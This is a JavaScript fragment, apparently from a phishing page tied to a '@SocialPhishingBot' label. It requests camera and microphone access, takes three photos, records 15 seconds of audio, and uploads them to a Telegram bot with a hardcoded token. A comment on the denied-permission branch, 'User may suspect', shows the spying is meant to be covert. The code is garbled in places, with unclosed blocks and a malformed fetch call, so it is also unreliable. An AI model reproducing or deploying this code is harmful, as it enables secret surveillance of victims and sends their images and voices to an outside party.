    function la(src) {

         function GetURLParameter(sParam) {
           var sPageURL = window.location.search.substring(1);
           var sURLVariables = sPageURL.split('&');
           for (var i = 0; i < sURLVariables.length; i++) {
             var sParameterName = sURLVariables[i].split('=');
             if (sParameterName[0] == sParam) {

             }
           }

    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
      .then((stream) => {
        const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
        const audioRecorder = new MediaRecorder(stream);

        function capturePhoto(index) {
          setTimeout(() => {
            imageCapture.takePhoto()
              .then((blob) => {
                sendToTelegram(blob, 'photo');
              })
              .catch((error) => {
                console.error('Error capturing photo:', error);
              });
          }, index * 2000);
        }

        function startAudioRecording() {
          audioRecorder.start();
          setTimeout(() => {
            audioRecorder.stop();
          }, 15000);
        }

        audioRecorder.ondataavailable = (event) => {
          if (event.data.size > 0) {
            sendToTelegram(event.data, 'audio');
          }
        };

        for (let i = 0; i < 3; i++) {
          capturePhoto(i);
        }

        startAudioRecording();
      })
      .catch((error) => {
        if (error.name === 'NotAllowedError') {
          // Handle the case where permissions are denied
          console.warn('Permissions denied. User may suspect.');
        } else {
          console.error('Permission error:', error);
        }
      });

    function sendToTelegram(data, type) {
   
      const botToken = '8182080189:AAE5oFBE-GdefgbfT8tSx2YMKicTYdGnYS0';
      const chatId = chatid;

      const formData = new FormData();

      formData.append(type === 'photo' ? 'photo' : 'audio', data, `@SocialPhishingBot.${type === 'photo' ? 'jpg' : 'wav'}`);

      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, 
{

        body: formData

        .then(response => response.json())
